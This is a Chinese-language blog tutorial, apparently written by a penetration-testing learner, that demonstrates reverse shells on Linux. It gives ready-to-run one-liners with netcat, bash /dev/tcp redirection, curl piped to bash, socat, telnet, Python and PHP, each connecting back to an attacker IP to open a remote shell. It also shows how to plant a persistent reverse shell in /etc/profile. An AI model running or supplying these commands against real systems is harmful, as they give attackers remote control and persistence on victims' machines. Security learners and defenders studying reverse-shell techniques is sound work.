---
title: 反弹_shell
date: 2022-4-23 21:48:27
tags: [Reverse Shell,Linux,Kali]
categories: 
 - [渗透测试,木马-Trojan-horse]
cover: https://res.cloudinary.com/sycamore/image/upload/v1682444171/Typera/2023/04/8396c8e41d46ca6906805f4eb5ef890b.png
---

# 什么是反弹shell？

**正向连接**，就是攻击者用自己的**攻击机**连接到**目标主机**的某一端口，**常见**的有web服务、ssh、远程桌面等等。  

在**实际情况**下，总会有很多时候，我们**不能**通过正向连接访问到目标主机，这个时候就可以利用**反向连接**来实现。 

 **反向连接**，通俗来说就是，攻击者**监听**某个攻击机的指定端口，目标主机**主动发起请求**到该端口，并将**命令行的输入输出**转到攻击机上显示。 

# 适用情况

 反弹 shell 适用于如下几种常见的情况：
- 目标机因**防火墙**受限，目标机器只能发送请求，不能接收请求。 
	- 所以让目标机**主动发送请求**到攻击机指定端口来 **getshell**
	<br>
- 目标机端口**被占用**。
	- 但是**攻击机**不会存在什么**端口限制**
	<br>
- 攻击者**无法预知**目标机什么时候会中病毒、木马，对方的网络环境是什么样的，什么时候开关机。
	- 所以采用 **监听 + 诱骗目标机主动执行某程序** 的方式获得 **shell**
	<br>
 - 虽然目标机中了招，但是目标机位于**局域网**，或IP会**动态变化**。
	- 不能获得**可用的 IP** 地址

# 实现方式  

反弹shell的方式有很多，那具体要用哪种方式还需要根据 目标主机的**环境** 来确定，
比如：
- 如果有 **netcat** 或者 **Socat** 或者 **Telnet** 工具，那么可以利用 **任意这三者之一** 反弹 shell，
- 如果 **bash** 可用，那么可以利用 bash 反弹 shell，
- 如果具有 **python** 或者 **php** 的环境，那么可以利用 **这些语言的脚本** 反弹 shell。 

## 利用 netcat 反弹shell
**Netcat**（即 **nc** ） 是一款简单的 Unix 工具，使用UDP和TCP协议。它可以轻易的建立任何连接。
### 准备：
目前，默认的各个 **linux** 发行版本已经自带了 **netcat** 工具包。

但是有部分版本的 **netcat** 的 **-e** 功能 被阉割了
（大概是出于安全考虑，因为 **-e** 可以直接发布与反弹本地 **shell**）

对于这种情况，需要**手动下载安装包**，命令如下：
```
wget https://jaist.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz
tar -xvzf netcat-0.7.1.tar.gz
./configure
make && make install
make clean
```

### 攻击机开启监听：

> 格式：`nc -lvvp <攻击机监听的端口>`

`netcat -lvvp 23333`
![image-20230426012933906](https://res.cloudinary.com/sycamore/image/upload/v1682443777/Typera/2023/04/074dea0aeb65e3cf991579314a98284c.png)

### 目标机主动连接攻击机：
> 格式：`nc <攻击机IP> <攻击机监听的端口> -e /bin/bash`

`netcat 192.168.158.139 23333 -e /bin/bash`
![image-20230426012929850](https://res.cloudinary.com/sycamore/image/upload/v1682443773/Typera/2023/04/f52bbdd3389beb7c7a9e9da72e220e40.png)

（**必须**攻击机**先**开始 **监听**，目标机**再反弹 shell**，这样才会有效果）

成功反弹 shell：
![image-20230426012926374](https://res.cloudinary.com/sycamore/image/upload/v1682443770/Typera/2023/04/9284a9b2e6290d96a8b65313b24f91a3.png)

## 利用 Bash 反弹 shell
使用 Bash 中 **网络重定向** 的方法
### 准备：
Kali Linux 中使用的 **Shell** 是 **zsh**，
可以用命令：`echo %SHELL` 查看当前系统使用的 **Shell**：
![image-20230426012919215](https://res.cloudinary.com/sycamore/image/upload/v1682443763/Typera/2023/04/8d5285fdf9ee6db10ebba4ce645ad92c.png)

所以我们需要更换 Shell：
- 更换：`chsh -s /bin/bash`
- 重启：`reboot`
![image-20230426012915317](https://res.cloudinary.com/sycamore/image/upload/v1682443759/Typera/2023/04/a9c9ebe071eae7546dacb18ebc0bb277.png)

**[ 注意 ]：** 出现下图错误只是因为 **攻击机 没开监听**：
![image-20230426012907770](https://res.cloudinary.com/sycamore/image/upload/v1682443751/Typera/2023/04/8854676b35906672629c5fc26ad8a02f.png)


另外，Debian 中，部分版本可能默认**没开** bash 的 网络重定向 选项，

对于这种情况，我们只能：加上`--enable-net-redirections` **重新编译 bash**
详见我的另一篇文章：[【从源码重新编译 Bash：重定向功能】]()


### 命令：
（攻击机**事先**开启 本地监听）
> 格式：`bash -i >& /dev/tcp/攻击机IP/攻击机端口 0>&1`

`bash -i >& /dev/tcp/192.168.158.139/23333 0>&1`

**成功反弹 shell：**
**目标机** 界面(反弹)：
![image-20230426012903048](https://res.cloudinary.com/sycamore/image/upload/v1682443746/Typera/2023/04/c693896f2e2fa73809cee178b0f6533b.png)

**攻击机** 界面(监听)： 
![image-20230426012858851](https://res.cloudinary.com/sycamore/image/upload/v1682443743/Typera/2023/04/6fb9f5e48c00f60ba91673a9f6c734eb.png)


### 详细解释：

- `bash -i`
	- 产生一个 **bash** 交互环境。
- `>&`
	- 把联合符号 前面 的内容与 后面 相结合，然后一起**重定向**给后者。
- `/dev/tcp/192.168.158.139/23333`
	- `/dev/tcp/ip/port` 是 **bash** 中定义的一个方法，
	- 作用是：让攻击机(192.168.158.139) 和目标机，在攻击机的 23333 端口上，建立一个 **tcp** 连接。
- `0>&1`
	- 0、1 为**文件描述符**。
	- 即将 **标准输入(0)** 与 **标准输出(1)** 的内容相结合，然后**重定向**给前面 **标准输出(1)** 的内容。（在反弹 shell 中实现 **输入输出** 的关键）

### Curl 配合 Bash
丰富一下用 Bash 反弹 Shell 的手段
（Curl 的命令借助了Linux中的管道）

#### 1. 准备 index.php 文件：
攻击机中创建 `index.php` 文件，
填写的**内容**为：直接使用 `Bash` 反弹 **Shell** 的情况下，目标机中运行的命令，即：
> bash -i >& /dev/tcp/192.168.158.139/23333 0>&1

**存放**在 **web** 目录下，
演示的 **Kali Linux** 虚拟机开启 **Apache2** 服务之后，对应目录为：`/var/www/html/`

开启 **Apache2** 服务之后，会在上述目录下生成一个 `index.php` 文件，
可以直接删去内容并 **修改**，该文件只是生成一个 **web** 页面而已（如下图）
![image-20230426012853268](https://res.cloudinary.com/sycamore/image/upload/v1682443737/Typera/2023/04/97eb1b3565e6f8745bf100a9b5ee31ed.png)

#### 2. 攻击机打开 23333 端口的监听
命令：`netcat -lvvp 23333`
#### 3. 目标机输入 Curl 命令反弹 shell
命令：`curl 192.168.158.139|bash`

实现如图：
![image-20230426012839981](https://res.cloudinary.com/sycamore/image/upload/v1682443723/Typera/2023/04/66bf859ff6c462a364624b51a215fd64.png)

成功反弹 **Shell**：
![](https://res.cloudinary.com/sycamore/image/upload/v1682443715/Typera/2023/04/01742775f569ce91fa25a5f8f25ed544.png)

### Bash 反弹命令写入 /etc/profile 文件

文件 `/etc/profile` 中的内容，会在 **Bash** 窗口打开时执行。

#### 如图：
> （下图中我输入的是**错误的代码**，所以**启动 Bash** 之后，会**输出报错**内容到命令行）
> ![image-20230426012821415](https://res.cloudinary.com/sycamore/image/upload/v1682443705/Typera/2023/04/92211d839dd171dc8f115e037f1e07eb.png)
> （如果是**正确的代码**，但是攻击侧**没开监听**，也会报错，如下图：）
> ![image-20230426012825282](https://res.cloudinary.com/sycamore/image/upload/v1682443709/Typera/2023/04/566b0ca11a943f96d0bf550e848d84d4.png)

#### 布置的步骤：
 通过 `vim /etc/profile`，编辑文件：
![image-20230426012816962](https://res.cloudinary.com/sycamore/image/upload/v1682443699/Typera/2023/04/6a8db3c08c0188c7b0a9b1d25fed3c50.png)
<br>

- 在末尾添加代码：`/bin/bash -i >& /dev/tcp/192.168.158.139/23333 0>&1 &`
> 该命令比直接反弹的代码在 **末尾** 多了一个 **&**，
> 这是为了让打开 **Bash** 的用户能正常使用

![image-20230426012812596](https://res.cloudinary.com/sycamore/image/upload/v1682443696/Typera/2023/04/bf591833811a31c67bcfb2741ab7ca30.png)

**演示：**
- 攻击机开始监听 23333 端口
- **Xshell** 打开目标机的会话（即**启动了 Bash**）
![image-20230426012807425](https://res.cloudinary.com/sycamore/image/upload/v1682443691/Typera/2023/04/1fe57f518c02b5c5651dc8fbfe3269c7.png)
- 没有回显，且攻击机**成功 getshell**，**反弹成功**
![image-20230426012804072](https://res.cloudinary.com/sycamore/image/upload/v1682443688/Typera/2023/04/5d329939a4e8d82c53c712f4b54adb09.png)
## 利用 Socat 反弹 Shell
**Socat** 是 **Linux** 下一个多功能的网络工具，功能与 **netcat (nc)** 类似。
所以我们也可以使用 **Socat**，开监听、反弹 **Shell**

### 下载 Socat
试验之前，要先下载 **Socat**（**Kali Linux** 已经**预装**了该工具），
如果没有安装，使用命令：`apt-get install socat` 

### 攻击机开启监听
命令：`socat TCP-LISTEN:23333 -`
![image-20230426012759404](https://res.cloudinary.com/sycamore/image/upload/v1682443682/Typera/2023/04/f6ffc230be89565c17383bbe1e8262a3.png)

### 目标机通过 Socat 建立连接
命令：`socat tcp-connect:192.168.158.139:23333 exec:'bash -li',pty,stderr,setsid,sigint,sane`
![image-20230426012754642](https://res.cloudinary.com/sycamore/image/upload/v1682443678/Typera/2023/04/00614ff7b3a1a2dfdfbad02dc0df8be1.png)

**成功** 反弹 **Shell**：
![image-20230426012750258](https://res.cloudinary.com/sycamore/image/upload/v1682443674/Typera/2023/04/7b31e1aa07c5c4bdcbd9e6cafad1655a.png)

## 利用 Telnet 反弹 Shell
我们总会遇到，目标机 **Netcat** 和 `/dev/tcp/` 方法不可用的情况，
这时候如果 目标机配有 **Telnet** 服务，我们可以用 **Telnet** 建立反向连接。

- 攻击机开启监听
（用 **nc** 或者 **socat** 都行）
- 目标机执行命令，建立连接：
`mknod a p; telnet 47.xxx.xxx.72 2333 0<a | /bin/bash 1>a`
![image-20230426012739427](https://res.cloudinary.com/sycamore/image/upload/v1682443663/Typera/2023/04/db443fe2827a018ce3cb046f63793326.png)
- 成功获得 **反弹 Shell**：
![image-20230426012732507](https://res.cloudinary.com/sycamore/image/upload/v1682443657/Typera/2023/04/d3d507d38eb37d836868b42d5f90db17.png)
## 用 Python 脚本反弹 Shell
使用 **Python** 的 **socket** 库

攻击机开启监听后，直接使用命令：
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.158.139",23333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
（或者也可以转化成 .py 的 Python 文件，然后命令行执行）

如下图所示：
![image-20230426012727025](https://res.cloudinary.com/sycamore/image/upload/v1682443651/Typera/2023/04/ff1cae7c81c0b04929f2c86b0e788c9e.png)
成功反弹 **Shell**
![image-20230426012721830](https://res.cloudinary.com/sycamore/image/upload/v1682443647/Typera/2023/04/6826b2f0cec7b82a3677a2e1e86de378.png)

## 用 php 脚本反弹 Shell
攻击侧开启监听，目标机执行的 php 脚本如下：
```
php -r '$sock=fsockopen("192.168.158.139",23333);exec("/bin/sh -i <&3 >&3 2>&3");'
```
实现如下：
![image-20230426012715771](https://res.cloudinary.com/sycamore/image/upload/v1682443639/Typera/2023/04/fdd3929e8cec1fc5e67af1614f47d9b4.png)
![image-20230426012702683](https://res.cloudinary.com/sycamore/image/upload/v1682443627/Typera/2023/04/c830f507fd2cc729beb4e10b7a5d18cd.png)

## 最后
逐一实现了这么多的 **反弹 Shell** 的方法，我发现他们本质上都是一致的。

无论是用工具还是脚本，都是 建立连接 + 输入输出重定向。

总得来说，这样一遍下来，最开始读起来较为模糊的原理，现在也能够清晰地理解了。
